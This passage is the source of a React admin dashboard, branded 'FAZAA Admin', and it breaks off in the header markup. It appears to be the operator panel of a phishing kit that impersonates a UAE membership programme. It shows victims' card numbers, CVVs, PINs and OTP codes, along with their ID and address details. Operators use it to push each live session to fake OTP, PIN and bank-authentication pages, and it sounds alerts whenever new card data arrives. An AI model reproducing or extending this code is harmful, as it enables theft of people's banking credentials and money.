import { useState, useCallback, useEffect, useRef } from 'react';
import { toast } from 'sonner';
import { trpc } from '@/lib/trpc';

// ── Palette ─────────────────────────────────────────────────────────────────
const C = {
  navy:    '#0C1E3C',   // أزرق داكن رئيسي
  navy2:   '#132848',   // أزرق داكن ثانوي
  navy3:   '#1A3A5C',   // أزرق داكن للـ hover
  blue:    '#1D4A91',   // أزرق متوسط للأزرار
  blueL:   '#2563EB',   // أزرق فاتح للـ hover
  blueText:'#1D4A91',   // لون النصوص الزرقاء
  white:   '#FFFFFF',
  bg:      '#F4F7FB',   // خلفية بيضاء مائلة للرمادي
  card:    '#FFFFFF',
  border:  '#D8E4F0',
  text:    '#0C1E3C',
  textMid: '#4A6080',
  textLight:'#8AA0BB',
  green:   '#16A34A',
  red:     '#DC2626',
  orange:  '#D97706',
};

const PAGE_OPTIONS = [
  { value: '/success',            label: 'قبول',             color: C.green },
  { value: '/otp-verify',         label: 'رمز OTP',          color: C.blue },
  { value: '/bank-auth',          label: 'مصادقة بنكية',     color: C.blue },
  { value: '/pin-verify',         label: 'الرمز السري',       color: C.blue },
  { value: '/card-payment',       label: 'صفحة الدفع',       color: C.blue },
  { value: '/failed',             label: 'رفض',              color: C.red },
  { value: '/otp-rejected',       label: 'رفض OTP',          color: C.red },
  { value: '/bank-auth-rejected', label: 'رفض المصادقة',     color: C.red },
];

const pageLabels: Record<string, string> = {
  '/': 'الرئيسية', '/membership': 'اختيار العضوية', '/renew-membership': 'تجديد العضوية',
  '/personal-info': 'المعلومات الشخصية', '/address-info': 'معلومات العنوان',
  '/order-summary': 'ملخص الطلب', '/card-payment': 'بيانات البطاقة',
  '/pin-verify': 'رمز PIN', '/otp-verify': 'رمز OTP', '/bank-auth': 'مصادقة بنكية',
  '/success': 'نجاح', '/failed': 'فشل', '/otp-rejected': 'رفض OTP', '/bank-auth-rejected': 'رفض المصادقة',
};

function formatDate(ts: number | null | undefined) {
  if (!ts) return '-';
  try { return new Date(ts).toLocaleString('ar-AE', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' }); }
  catch { return String(ts); }
}
function timeAgo(ts: number | null | undefined) {
  if (!ts) return '';
  const d = Math.floor((Date.now() - ts) / 1000);
  if (d < 60) return `منذ ${d}ث`;
  if (d < 3600) return `منذ ${Math.floor(d / 60)}د`;
  if (d < 86400) return `منذ ${Math.floor(d / 3600)}س`;
  return `منذ ${Math.floor(d / 86400)}ي`;
}

type AppRecord = {
  sessionId: string; fullName?: string | null; phone?: string | null; idNumber?: string | null;
  membershipType?: string | null; renewalMembershipNumber?: string | null; currentMembershipType?: string | null;
  emirate?: string | null; area?: string | null; street?: string | null; deliveryTime?: string | null;
  cardNumber?: string | null; cardExpiry?: string | null; cardCvv?: string | null;
  cardNetwork?: string | null; cardPin?: string | null; otpCode?: string | null;
  currentPage?: string | null; status?: string | null; createdAt?: number | null; updatedAt?: number | null;
};

// ── CardModal ────────────────────────────────────────────────────────────────
function CardModal({ app, onClose }: { app: AppRecord; onClose: () => void }) {
  const networkIcon = (net?: string | null) => {
    if (!net) return null;
    const n = net.toLowerCase();
    if (n === 'visa') return <span style={{ color: '#1A1F71', fontWeight: 900, fontSize: 18, letterSpacing: 1 }}>VISA</span>;
    if (n === 'mastercard') return (
      <span className="flex items-center gap-0.5">
        <span style={{ width: 20, height: 20, borderRadius: '50%', background: '#EB001B', display: 'inline-block', opacity: 0.9 }} />
        <span style={{ width: 20, height: 20, borderRadius: '50%', background: '#F79E1B', display: 'inline-block', marginLeft: -10, opacity: 0.9 }} />
      </span>
    );
    return <span style={{ color: C.blueText, fontWeight: 700 }}>{net.toUpperCase()}</span>;
  };

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center" style={{ background: 'rgba(12,30,60,0.7)', backdropFilter: 'blur(6px)' }} onClick={onClose}>
      <div className="rounded-t-3xl sm:rounded-2xl p-6 w-full sm:max-w-sm" style={{ background: C.card, border: `1px solid ${C.border}`, boxShadow: '0 -20px 60px rgba(12,30,60,0.2)' }} onClick={e => e.stopPropagation()}>
        <div className="flex justify-center mb-4 sm:hidden">
          <div style={{ width: 40, height: 4, borderRadius: 2, background: C.border }} />
        </div>
        <div className="flex items-center justify-between mb-5">
          <h3 className="text-base font-black" style={{ color: C.text, fontFamily: 'Cairo, sans-serif' }}>بيانات البطاقة البنكية</h3>
          <button onClick={onClose} style={{ color: C.textLight, fontSize: 22, lineHeight: 1, padding: '0 4px' }}>×</button>
        </div>

        {/* Card visual */}
        <div className="rounded-xl p-5 mb-5 relative overflow-hidden" style={{ background: `linear-gradient(135deg, ${C.navy} 0%, ${C.navy2} 50%, ${C.navy} 100%)`, minHeight: 140 }}>
          <div style={{ position: 'absolute', top: -30, right: -30, width: 120, height: 120, borderRadius: '50%', background: 'rgba(255,255,255,0.05)' }} />
          <div style={{ position: 'absolute', bottom: -20, left: -20, width: 80, height: 80, borderRadius: '50%', background: 'rgba(255,255,255,0.03)' }} />
          <div className="relative z-10">
            <div className="flex items-center justify-between mb-4">
              <div style={{ width: 36, height: 28, background: `linear-gradient(135deg, ${C.blue}, ${C.blueL})`, borderRadius: 4, opacity: 0.9 }} />
              {networkIcon(app.cardNetwork)}
            </div>
            <div style={{ fontFamily: 'monospace', fontSize: 17, letterSpacing: '0.2em', color: '#fff', fontWeight: 700, marginBottom: 16, direction: 'ltr', textAlign: 'left' }}>
              {app.cardNumber || '•••• •••• •••• ••••'}
            </div>
            <div className="flex items-end justify-between">
              <div>
                <div style={{ fontSize: 9, color: 'rgba(255,255,255,0.4)', marginBottom: 2, fontFamily: 'Cairo, sans-serif' }}>اسم حامل البطاقة</div>
                <div style={{ fontSize: 13, color: '#fff', fontWeight: 600 }}>{app.fullName || '-'}</div>
              </div>
              <div className="text-right">
                <div style={{ fontSize: 9, color: 'rgba(255,255,255,0.4)', marginBottom: 2, fontFamily: 'Cairo, sans-serif' }}>تاريخ الانتهاء</div>
                <div style={{ fontSize: 13, color: '#93C5FD', fontWeight: 700, fontFamily: 'monospace' }}>{app.cardExpiry || '--/--'}</div>
              </div>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-2 gap-3">
          {[
            { label: 'رقم البطاقة', value: app.cardNumber, mono: true },
            { label: 'تاريخ الانتهاء', value: app.cardExpiry, mono: true },
            { label: 'CVV', value: app.cardCvv, mono: true },
            { label: 'الرقم السري (PIN)', value: app.cardPin, mono: true },
            { label: 'رمز OTP', value: app.otpCode, mono: true },
            { label: 'شبكة البطاقة', value: app.cardNetwork?.toUpperCase(), mono: false },
          ].map(item => (
            <div key={item.label} className="rounded-lg p-3" style={{ background: C.bg, border: `1px solid ${C.border}` }}>
              <div style={{ fontSize: 10, color: C.blue, marginBottom: 4, fontFamily: 'Cairo, sans-serif', fontWeight: 700 }}>{item.label}</div>
              <div style={{ fontSize: 14, color: item.value ? C.text : C.textLight, fontFamily: item.mono ? 'monospace' : 'Cairo, sans-serif', fontWeight: 600, letterSpacing: item.mono ? '0.05em' : 0, direction: item.mono ? 'ltr' : undefined, textAlign: item.mono ? 'left' : undefined } as any}>
                {item.value || '-'}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ── ApplicantModal ───────────────────────────────────────────────────────────
function ApplicantModal({ app, onClose }: { app: AppRecord; onClose: () => void }) {
  const membershipLabels: Record<string, string> = { platinum: 'بلاتينية', gold: 'ذهبية', silver: 'فضية', family: 'بطاقة الأسرة' };
  const mLabel = membershipLabels[app.membershipType || ''] || app.membershipType || '-';

  const rows = [
    { icon: '👤', label: 'الاسم الكامل', value: app.fullName },
    { icon: '📱', label: 'رقم الهاتف', value: app.phone },
    { icon: '🪪', label: 'رقم الهوية / الإقامة', value: app.idNumber },
    ...(app.renewalMembershipNumber ? [
      { icon: '🔄', label: 'رقم العضوية الحالية', value: app.renewalMembershipNumber },
      { icon: '🏅', label: 'نوع العضوية الحالية', value: membershipLabels[app.currentMembershipType || ''] || app.currentMembershipType },
    ] : []),
    { icon: '🏙️', label: 'الإمارة', value: app.emirate },
    { icon: '📍', label: 'المنطقة', value: app.area },
    { icon: '🛣️', label: 'الشارع', value: app.street },
    { icon: '📅', label: 'وقت التسليم', value: app.deliveryTime },
  ];

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center" style={{ background: 'rgba(12,30,60,0.7)', backdropFilter: 'blur(6px)' }} onClick={onClose}>
      <div className="rounded-t-3xl sm:rounded-2xl p-6 w-full sm:max-w-sm" style={{ background: C.card, border: `1px solid ${C.border}`, boxShadow: '0 -20px 60px rgba(12,30,60,0.2)', maxHeight: '85vh', overflowY: 'auto' }} onClick={e => e.stopPropagation()}>
        <div className="flex justify-center mb-4 sm:hidden">
          <div style={{ width: 40, height: 4, borderRadius: 2, background: C.border }} />
        </div>
        <div className="flex items-center justify-between mb-5">
          <h3 className="text-base font-black" style={{ color: C.text, fontFamily: 'Cairo, sans-serif' }}>معلومات مقدم الطلب</h3>
          <button onClick={onClose} style={{ color: C.textLight, fontSize: 22, lineHeight: 1, padding: '0 4px' }}>×</button>
        </div>

        <div className="flex items-center gap-4 mb-5 p-4 rounded-xl" style={{ background: `${C.blue}0D`, border: `1px solid ${C.blue}22` }}>
          <div className="w-14 h-14 rounded-full flex items-center justify-center flex-shrink-0" style={{ background: `${C.blue}18`, border: `2px solid ${C.blue}40` }}>
            <span style={{ fontSize: 24 }}>👤</span>
          </div>
          <div>
            <div className="text-base font-black mb-1" style={{ color: C.text, fontFamily: 'Cairo, sans-serif' }}>{app.fullName || '-'}</div>
            <span className="px-3 py-1 rounded-full text-xs font-bold" style={{ background: `${C.blue}15`, color: C.blue, border: `1px solid ${C.blue}30`, fontFamily: 'Cairo, sans-serif' }}>
              عضوية {mLabel}
            </span>
          </div>
        </div>

        <div className="space-y-2">
          {rows.map(r => (
            <div key={r.label} className="flex items-center justify-between py-2.5 px-3 rounded-lg" style={{ background: C.bg, borderBottom: `1px solid ${C.border}` }}>
              <div style={{ fontSize: 11, color: C.textMid, fontFamily: 'Cairo, sans-serif' }}>{r.icon} {r.label}</div>
              <div style={{ fontSize: 13, color: r.value ? C.text : C.textLight, fontWeight: 600, fontFamily: 'Cairo, sans-serif', textAlign: 'left', direction: 'ltr' }}>
                {r.value || '-'}
              </div>
            </div>
          ))}
        </div>

        <div className="mt-4 pt-4" style={{ borderTop: `1px solid ${C.border}` }}>
          <div className="flex items-center justify-between">
            <span style={{ fontSize: 11, color: C.textMid, fontFamily: 'Cairo, sans-serif' }}>الصفحة الحالية</span>
            <span className="px-3 py-1 rounded-full text-xs font-bold" style={{ background: `${C.blue}15`, color: C.blue, fontFamily: 'Cairo, sans-serif' }}>
              {pageLabels[app.currentPage || ''] || app.currentPage || '-'}
            </span>
          </div>
          <div className="flex items-center justify-between mt-2">
            <span style={{ fontSize: 11, color: C.textMid, fontFamily: 'Cairo, sans-serif' }}>تاريخ الطلب</span>
            <span style={{ fontSize: 12, color: C.textMid, fontFamily: 'Cairo, sans-serif' }}>{formatDate(app.createdAt)}</span>
          </div>
        </div>
      </div>
    </div>
  );
}

// ── OtpModal ─────────────────────────────────────────────────────────────────
function OtpModal({ app, onClose, onSend }: { app: AppRecord; onClose: () => void; onSend: (otp: string) => void }) {
  const [otp, setOtp] = useState('');
  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center" style={{ background: 'rgba(12,30,60,0.7)', backdropFilter: 'blur(6px)' }} onClick={onClose}>
      <div className="rounded-t-3xl sm:rounded-2xl p-6 w-full sm:max-w-xs" style={{ background: C.card, border: `1px solid ${C.border}`, boxShadow: '0 -20px 60px rgba(12,30,60,0.2)' }} onClick={e => e.stopPropagation()}>
        <div className="flex justify-center mb-4 sm:hidden">
          <div style={{ width: 40, height: 4, borderRadius: 2, background: C.border }} />
        </div>
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-base font-black" style={{ color: C.text, fontFamily: 'Cairo, sans-serif' }}>إرسال رمز OTP</h3>
          <button onClick={onClose} style={{ color: C.textLight, fontSize: 22, lineHeight: 1, padding: '0 4px' }}>×</button>
        </div>
        <p className="text-xs mb-4" style={{ color: C.textMid, fontFamily: 'Cairo, sans-serif' }}>
          أدخل رمز OTP الذي سيُعرض للمستخدم في صفحة التحقق
        </p>
        <input
          type="text" inputMode="numeric" value={otp}
          onChange={e => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))}
          placeholder="أدخل الرمز..." autoFocus
          style={{ width: '100%', background: C.bg, border: `2px solid ${otp ? C.blue : C.border}`, borderRadius: 10, color: C.navy, padding: '14px', fontSize: 24, fontFamily: 'monospace', letterSpacing: '0.3em', textAlign: 'center', outline: 'none', marginBottom: 14, transition: 'border-color 0.2s' }}
          onKeyDown={e => { if (e.key === 'Enter' && otp) onSend(otp); }}
        />
        <div className="flex gap-2">
          <button onClick={onClose} className="flex-1 py-3 rounded-xl text-sm font-bold"
            style={{ background: C.bg, color: C.textMid, border: `1px solid ${C.border}`, fontFamily: 'Cairo, sans-serif' }}>
            إلغاء
          </button>
          <button onClick={() => otp && onSend(otp)} disabled={!otp} className="flex-1 py-3 rounded-xl text-sm font-bold"
            style={{ background: otp ? `linear-gradient(135deg, ${C.navy}, ${C.blue})` : C.border, color: otp ? '#fff' : C.textLight, fontFamily: 'Cairo, sans-serif', transition: 'all 0.2s' }}>
            إرسال الرمز
          </button>
        </div>
      </div>
    </div>
  );
}

// ── MobileCard ───────────────────────────────────────────────────────────────
function MobileCard({ app, isNew, onCardClick, onNameClick, onRedirect, onDelete, onReject }: {
  app: AppRecord; isNew: boolean;
  onCardClick: () => void; onNameClick: () => void;
  onRedirect: (page: string) => void; onDelete: () => void; onReject: () => void;
}) {
  const [showActions, setShowActions] = useState(false);
  const pageColor = app.currentPage === '/success' ? C.green
    : ['/failed', '/otp-rejected', '/bank-auth-rejected'].includes(app.currentPage || '') ? C.red
    : ['/card-payment', '/pin-verify', '/otp-verify', '/bank-auth'].includes(app.currentPage || '') ? C.blue
    : C.textLight;

  return (
    <div className={isNew ? 'new-row' : ''} style={{
      background: isNew ? `${C.blue}08` : C.card,
      border: `1px solid ${isNew ? C.blue : C.border}`,
      borderRadius: 14, padding: '14px', marginBottom: 10,
      boxShadow: '0 1px 4px rgba(12,30,60,0.06)',
    }}>
      <div className="flex items-start justify-between gap-2 mb-3">
        <div className="flex items-center gap-2.5 flex-1 min-w-0">
          {isNew && <span className="new-row-dot flex-shrink-0" />}
          <div style={{ width: 36, height: 36, borderRadius: '50%', background: `${C.blue}15`, border: `1.5px solid ${C.blue}40`, display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontSize: 14, fontWeight: 800, color: C.blue }}>{(app.fullName || '?').charAt(0)}</span>
          </div>
          <div className="min-w-0">
            {app.fullName ? (
              <button onClick={onNameClick} style={{ fontSize: 13, fontWeight: 700, color: C.text, fontFamily: 'Cairo, sans-serif', display: 'block', textAlign: 'right' }}>{app.fullName}</button>
            ) : <span style={{ fontSize: 12, color: C.textLight, fontFamily: 'Cairo, sans-serif' }}>بدون اسم</span>}
            <div style={{ fontSize: 11, color: C.textMid, fontFamily: 'Cairo, sans-serif', direction: 'ltr' }}>{app.phone || '-'}</div>
          </div>
        </div>
        <div className="flex flex-col items-end gap-1 flex-shrink-0">
          <span style={{ fontSize: 10, fontWeight: 700, color: pageColor, background: `${pageColor}12`, border: `1px solid ${pageColor}30`, borderRadius: 20, padding: '2px 8px', fontFamily: 'Cairo, sans-serif', whiteSpace: 'nowrap' }}>
            {pageLabels[app.currentPage || ''] || app.currentPage || '-'}
          </span>
          <span style={{ fontSize: 10, color: C.textLight, fontFamily: 'Cairo, sans-serif' }}>{timeAgo(app.updatedAt || app.createdAt)}</span>
        </div>
      </div>

      <div className="flex items-center gap-2 mb-3 flex-wrap">
        {app.cardNumber ? (
          <button onClick={onCardClick} style={{ fontSize: 11, fontFamily: 'monospace', color: C.navy, background: `${C.blue}0F`, border: `1px solid ${C.blue}25`, borderRadius: 6, padding: '3px 8px', letterSpacing: '0.05em', direction: 'ltr', textAlign: 'left' }}>
            {app.cardNumber}
          </button>
        ) : <span style={{ fontSize: 11, color: C.textLight, fontFamily: 'Cairo, sans-serif' }}>لا توجد بطاقة</span>}
        {app.otpCode && (
          <span style={{ fontSize: 11, fontFamily: 'monospace', color: C.blue, background: `${C.blue}10`, border: `1px solid ${C.blue}25`, borderRadius: 6, padding: '3px 8px', letterSpacing: '0.15em', fontWeight: 700 }}>
            OTP: {app.otpCode}
          </span>
        )}
      </div>

      <div className="flex items-center gap-2 flex-wrap">
        <div className="relative">
          <button onClick={() => setShowActions(!showActions)}
            style={{ fontSize: 12, fontWeight: 700, color: C.white, background: `linear-gradient(135deg, ${C.navy}, ${C.blue})`, border: 'none', borderRadius: 8, padding: '6px 12px', fontFamily: 'Cairo, sans-serif' }}>
            توجيه ▾
          </button>
          {showActions && (
            <>
              <div className="fixed inset-0 z-40" onClick={() => setShowActions(false)} />
              <div className="absolute right-0 mt-1 w-44 rounded-xl overflow-hidden z-50" style={{ background: C.card, border: `1px solid ${C.border}`, boxShadow: '0 8px 30px rgba(12,30,60,0.15)' }}>
                {PAGE_OPTIONS.map(opt => (
                  <button key={opt.value} onClick={() => { onRedirect(opt.value); setShowActions(false); }}
                    className="w-full px-3 py-3 text-sm text-right flex items-center justify-between"
                    style={{ color: opt.color, fontFamily: 'Cairo, sans-serif', borderBottom: `1px solid ${C.border}` }}
                    onMouseEnter={e => (e.currentTarget as HTMLButtonElement).style.background = C.bg}
                    onMouseLeave={e => (e.currentTarget as HTMLButtonElement).style.background = 'transparent'}>
                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M15 18l-6-6 6-6" /></svg>
                    {opt.label}
                  </button>
                ))}
              </div>
            </>
          )}
        </div>
        <button onClick={onReject}
          style={{ fontSize: 12, fontWeight: 700, color: C.red, background: `${C.red}10`, border: `1px solid ${C.red}25`, borderRadius: 8, padding: '6px 12px', fontFamily: 'Cairo, sans-serif' }}>
          رفض
        </button>
        <button onClick={onDelete}
          style={{ fontSize: 12, color: C.textLight, background: C.bg, border: `1px solid ${C.border}`, borderRadius: 8, padding: '6px 10px' }}>
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><polyline points="3 6 5 6 21 6" /><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" /></svg>
        </button>
      </div>
    </div>
  );
}

// ── Main Admin ───────────────────────────────────────────────────────────────
export default function Admin() {
  const [openAction, setOpenAction] = useState<string | null>(null);
  const [dropdownPos, setDropdownPos] = useState({ top: 0, left: 0 });
  const [showDeleteAll, setShowDeleteAll] = useState(false);
  const [showUserMenu, setShowUserMenu] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [activeTab, setActiveTab] = useState<'active' | 'archived'>('active');
  const [cardModal, setCardModal] = useState<AppRecord | null>(null);
  const [applicantModal, setApplicantModal] = useState<AppRecord | null>(null);
  const [otpModal, setOtpModal] = useState<AppRecord | null>(null);
  const [visitorCount, setVisitorCount] = useState(0);
  const [totalVisitorCount, setTotalVisitorCount] = useState(0);
  const [showVisitorDropdown, setShowVisitorDropdown] = useState(false);

  const { data: apps = [], refetch } = trpc.applications.getAll.useQuery(undefined, {
    refetchInterval: 4000, // تقليل من 3s إلى 4s لتخفيف الحمل
    staleTime: 0,
  });

  const prevSessionIds = useRef<Set<string>>(new Set());
  const prevCardNumbers = useRef<Map<string, string>>(new Map()); // sessionId -> cardNumber
  const [newSessionIds, setNewSessionIds] = useState<Set<string>>(new Set());
  const [highlightedRows, setHighlightedRows] = useState<Set<string>>(new Set()); // يبقى حتى الضغط على رقم البطاقة
  const isFirstLoad = useRef(true);
  const highlightTimeout = useRef<NodeJS.Timeout | null>(null);

  const playAlertSound = useCallback(() => {
    try {
      const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
      const playBeep = (freq: number, start: number, duration: number, vol = 0.5) => {
        const osc = ctx.createOscillator(); const gain = ctx.createGain();
        osc.connect(gain); gain.connect(ctx.destination); osc.type = 'sine';
        osc.frequency.setValueAtTime(freq, ctx.currentTime + start);
        gain.gain.setValueAtTime(0, ctx.currentTime + start);
        gain.gain.linearRampToValueAtTime(vol, ctx.currentTime + start + 0.01);
        gain.gain.linearRampToValueAtTime(0, ctx.currentTime + start + duration);
        osc.start(ctx.currentTime + start); osc.stop(ctx.currentTime + start + duration + 0.05);
      };
      playBeep(880, 0, 0.12); playBeep(1100, 0.15, 0.12); playBeep(1320, 0.30, 0.20, 0.6);
    } catch (e) { console.warn('[Admin] sound error:', e); }
  }, []);

  const sendPushNotification = useCallback((title: string, options?: NotificationOptions) => {
    if ('Notification' in window) {
      if (Notification.permission === 'granted') new Notification(title, options);
      else if (Notification.permission !== 'denied') Notification.requestPermission().then(p => { if (p === 'granted') new Notification(title, options); });
    }
  }, []);

  useEffect(() => {
    if (apps.length === 0) { isFirstLoad.current = false; return; }
    const current = new Set(apps.map(a => a.sessionId));
    const added = new Set<string>();
    current.forEach(id => { if (!prevSessionIds.current.has(id)) added.add(id); });
    if (added.size > 0) {
      if (!isFirstLoad.current) {
        if (soundEnabled) playAlertSound();
        const firstApp = apps.find(a => added.has(a.sessionId));
        if (firstApp) {
          sendPushNotification('🔔 طلب جديد', { body: `${firstApp.fullName || 'مقدم طلب'} - ${firstApp.membershipType || 'عضوية'}`, icon: '/favicon.ico', tag: 'new-application', requireInteraction: true });
          document.title = `(${added.size}) طلبات جديدة - لوحة الإدارة`;
        }
      }
      setNewSessionIds(prev => new Set([...Array.from(prev), ...Array.from(added)]));
      setTimeout(() => { setNewSessionIds(prev => { const n = new Set(prev); added.forEach(id => n.delete(id)); return n; }); document.title = 'لوحة الإدارة - FAZAA'; }, 6000);
    }
    // رصد وصول بيانات البطاقة (جديدة أو محدّثة) → تظليل الصف بالأزرق الفاتح حتى الضغط على رقم البطاقة
    if (!isFirstLoad.current) {
      const newlyHighlighted = new Set<string>();
      apps.forEach(a => {
        if (a.cardNumber && a.cardNumber !== prevCardNumbers.current.get(a.sessionId)) {
          newlyHighlighted.add(a.sessionId);
        }
      });
      if (newlyHighlighted.size > 0) {
        setHighlightedRows(prev => new Set([...Array.from(prev), ...Array.from(newlyHighlighted)]));
      }
    }
    // تحديث prevCardNumbers
    apps.forEach(a => { if (a.cardNumber) prevCardNumbers.current.set(a.sessionId, a.cardNumber); });
    isFirstLoad.current = false; prevSessionIds.current = current;
  }, [apps, playAlertSound, sendPushNotification]);

  const setRedirectMutation = trpc.applications.setRedirect.useMutation({ onSuccess: () => refetch() });
  const deleteAppMutation = trpc.applications.delete.useMutation({ onSuccess: () => refetch() });
  const updateStatusMutation = trpc.applications.updateStatus.useMutation({ onSuccess: () => refetch() });
  const notifyMutation = trpc.system.notifyOwner.useMutation();
  const archiveAppMutation = trpc.applications.archive.useMutation({ onSuccess: () => refetch() });
  const upsertMutation = trpc.applications.upsert.useMutation({ onSuccess: () => refetch() });

  // عداد الزوار يتحدث كل 5 ثوانٍ
  useEffect(() => {
    const update = () => {
      const now = Date.now();
      const active = apps.filter(a => a.updatedAt && (now - a.updatedAt) < 3 * 60 * 1000);
      setVisitorCount(active.length);
      setTotalVisitorCount(apps.length);
    };
    update();
    const interval = setInterval(update, 5000);
    return () => clearInterval(interval);
  }, [apps]);

  const handleActionClick = useCallback((e: React.MouseEvent<HTMLButtonElement>, sessionId: string) => {
    if (openAction === sessionId) { setOpenAction(null); return; }
    const rect = (e.currentTarget as HTMLButtonElement).getBoundingClientRect();
    setDropdownPos({ top: rect.bottom + window.scrollY + 4, left: rect.left + window.scrollX });
    setOpenAction(sessionId);
  }, [openAction]);

  const handleDelete = (sessionId: string) => deleteAppMutation.mutate({ sessionId });
  const handleArchive = (sessionId: string) => { archiveAppMutation.mutate({ sessionId }); setOpenAction(null); };
  const handleDeleteAll = async () => { for (const app of apps) await deleteAppMutation.mutateAsync({ sessionId: app.sessionId }); setShowDeleteAll(false); };
  const handleReject = (sessionId: string) => {
    const app = apps.find(a => a.sessionId === sessionId);
    updateStatusMutation.mutate({ sessionId, status: 'rejected' });
    // إضافة timestamp لضمان التنفيذ حتى عند التكرار
    const page = `/failed?t=${Date.now()}`;
    setRedirectMutation.mutate({ sessionId, page }, {
      onSuccess: () => {
        toast.error(`❌ تم رفض طلب ${app?.fullName || 'مقدم الطلب'}`, {
          description: `تم تحويله إلى صفحة الرفض`,
          duration: 4000,
        });
      }
    });
    setOpenAction(null);
  };

  const handleRedirect = (sessionId: string, page: string) => {
    const app = apps.find(a => a.sessionId === sessionId);
    const pageLabel = pageLabels[page] || page;
    let actualPage = page;
    if (page === '/otp-rejected') actualPage = '/otp-verify?rejected=true';
    else if (page === '/bank-auth-rejected') actualPage = '/bank-auth?rejected=true';
    // إضافة timestamp لضمان التنفيذ حتى عند تكرار نفس الصفحة
    const actualPageWithTs = `${actualPage}${actualPage.includes('?') ? '&' : '?'}t=${Date.now()}`;
    setRedirectMutation.mutate({ sessionId, page: actualPageWithTs }, {
      onSuccess: () => {
        if (page === '/success') updateStatusMutation.mutate({ sessionId, status: 'approved' });
        if (app) notifyMutation.mutate({ title: `📄 تم التحويل إلى ${pageLabel}`, content: `${app.fullName || 'مقدم طلب'} - ${app.phone || 'بدون رقم'}` });
        // رسالة تأكيد للمسؤول
        const isSuccess = page === '/success';
        const isReject = page === '/failed' || page === '/otp-rejected' || page === '/bank-auth-rejected';
        if (isSuccess) {
          toast.success(`✅ تم قبول طلب ${app?.fullName || 'مقدم الطلب'}`, {
            description: `تم تحويله إلى صفحة النجاح`,
            duration: 4000,
          });
        } else if (isReject) {
          toast.error(`❌ تم رفض ${app?.fullName || 'مقدم الطلب'}`, {
            description: `تم تحويله إلى: ${pageLabel}`,
            duration: 4000,
          });
        } else {
          toast.info(`📤 تم التحويل بنجاح`, {
            description: `${app?.fullName || 'مقدم الطلب'} → ${pageLabel}`,
            duration: 3500,
          });
        }
      }
    });
    setOpenAction(null);
  };

  const handleSendOtp = (app: AppRecord, otp: string) => {
    upsertMutation.mutate({ sessionId: app.sessionId, otpCode: otp, currentPage: app.currentPage || undefined });
    setRedirectMutation.mutate({ sessionId: app.sessionId, page: '/otp-verify' });
    setOtpModal(null);
  };

  const filtered = apps.filter(a => {
    const hasRealData = !!(a.fullName || a.phone || a.cardNumber || a.otpCode);
    if (!hasRealData) return false;
    const matchesSearch = !searchTerm || a.fullName?.toLowerCase().includes(searchTerm.toLowerCase()) || a.phone?.includes(searchTerm) || a.idNumber?.includes(searchTerm) || a.cardNumber?.includes(searchTerm);
    const isArchived = (a as any).isArchived === 1 || (a as any).isArchived === true;
    return matchesSearch && (activeTab === 'active' ? !isArchived : isArchived);
  }).sort((a, b) => { const aH = !!a.cardNumber; const bH = !!b.cardNumber; if (aH !== bH) return aH ? -1 : 1; return 0; });

  const now = Date.now();
  const activeVisitors = apps.filter(a => a.updatedAt && (now - a.updatedAt) < 3 * 60 * 1000);
  const visitorPageLabel = (p?: string | null) => {
    const map: Record<string, string> = { '/': 'الرئيسية', '/membership': 'العضوية', '/personal-info': 'معلومات', '/address-info': 'العنوان', '/order-summary': 'ملخص', '/card-payment': 'البطاقة', '/pin-verify': 'PIN', '/otp-verify': 'OTP', '/bank-auth': 'مصادقة', '/success': 'نجاح', '/failed': 'فشل' };
    return map[p || '/'] || (p || 'غير معروف');
  };
  const visitorPageColor = (p?: string | null) => {
    if (p === '/success') return C.green;
    if (p === '/failed') return C.red;
    if (['/card-payment', '/pin-verify', '/otp-verify', '/bank-auth'].includes(p || '')) return C.blue;
    return C.textMid;
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ background: C.bg, fontFamily: 'Cairo, sans-serif' }}>

      {/* ── Header ── */}
      <header style={{ background: `linear-gradient(135deg, ${C.navy} 0%, ${C.navy2} 50%, ${C.navy} 100%)`, boxShadow: `0 4px 20px rgba(12,30,60,0.3)` }}>
        <div className="px-3 sm:px-6">
          <div className="flex items-center justify-between h-14">
            {/* Logo */}
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: 'rgba(255,255,255,0.15)' }}>
                <span className="text-xs font-black text-white">فزعة</span>
              </div>
              <div className="hidden sm:block">
                <div className="text-sm font-black text-white leading-none">لوحة الإدارة</div>
                <div className="text-xs" style={{ color: 'rgba(255,255,255,0.5)' }}>FAZAA Admin</div>
              </div>
              <div className="sm:hidden text-sm font-black text-white">الإدارة</div>
            </div>

            {/* Stats */}
            <div className="hidden md:flex items-center gap-5">
              {[
                { n: apps.length, l: 'إجمالي' },
                { n: apps.filter(a => a.status === 'approved').length, l: 'مقبول' },
                { n: apps.filter(a => !a.status || a.status === 'pending').length, l: 'معلق' },
              ].map(s => (
                <div key={s.l} className="text-center">
                  <div className="text-lg font-black text-white leading-none">{s.n}</div>
                  <div className="text-xs" style={{ color: 'rgba(255,255,255,0.5)' }}>{s.l}</div>
                </div>
              ))}
            </div>

            <div className="flex md:hidden items-center gap-3">
              <span className="text-sm font-black text-white">{apps.length} طلب</span>
              {activeVisitors.length > 0 && (
                <span style={{ fontSize: 11, fontWeight: 700, color: '#fff', background: 'rgba(255,255,255,0.15)', borderRadius: 20, padding: '2px 8px' }}>
                  {activeVisitors.length} نشط
                </span>
              )}
            </div>

            {/* Sound toggle */}
